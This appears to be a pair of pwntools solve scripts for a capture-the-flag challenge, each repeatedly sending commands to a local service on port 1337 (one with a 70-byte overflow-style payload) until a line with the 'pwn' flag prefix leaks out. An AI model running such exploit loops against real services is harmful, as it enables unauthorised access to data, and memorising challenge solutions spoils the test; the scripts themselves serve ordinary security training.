from pwn import *

r =  remote('0.0.0.0','1337')
flag = 0
while True:
    r.sendline(b'send_message')
    r.recvuntil(b'Message: ')
    r.sendline(b'0'*70)
    r.sendline(b'receive_message')
    r.recvuntil(b'Message: ')
    a = r.recvline()
    if b'pwn' in a :
        print(a)
        break

r.close()

### b.py
from pwn import *

r =  remote('0.0.0.0','1337')
flag = 0
while True:
    r.sendline(b'send_redacted_flag')
    for i in range(5) :
        r.sendline(b'receive_message')
        a = r.recvline()
        if b'pwn' in a :
            flag = 1
            print(a)
            break
    if flag == 1:
        break

r.close()
